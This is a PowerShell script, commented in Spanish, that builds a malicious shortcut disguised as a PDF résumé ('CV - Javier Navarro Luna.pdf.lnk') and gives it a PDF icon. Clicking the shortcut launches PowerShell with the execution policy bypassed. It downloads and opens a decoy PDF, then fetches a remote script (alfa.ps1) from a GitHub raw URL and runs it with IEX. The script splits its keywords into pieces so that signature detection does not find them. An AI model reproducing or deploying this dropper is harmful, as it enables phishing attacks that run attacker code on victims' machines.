$WshShell = New-Object -ComObject WScript.Shell

$Shortcut = $WshShell.CreateShortcut("$pwd\CV - Javier Navarro Luna.pdf.lnk")

# Construir las palabras clave por partes (no aparecen completas en el .ps1)
$dl = "Down" + "load" + "File"
$ds = "Down" + "load" + "String"
$iex = "I" + "EX"

$url1 = "https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf"
$url2 = "https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1"
$pdf = "CV - Javier Navarro Luna.pdf"

$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/C powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).$dl('$url1', '.\$pdf')`" & cmd.exe /c start `"`" `"$pdf`" & powershell.exe -nop -ExecutionPolicy Bypass -c `"$iex (New-Object Net.WebClient).$ds('$url2')`""

$progId = (Get-Item "HKCR:\.pdf" -ErrorAction SilentlyContinue)."(Default)"
$pdfIcon = (Get-ItemProperty "HKCR:\$progId\DefaultIcon" -ErrorAction SilentlyContinue)."(Default)"
if (-not $pdfIcon) { $pdfIcon = "C:\Windows\System32\shell32.dll,75" }
$Shortcut.IconLocation = $pdfIcon

$Shortcut.Save()

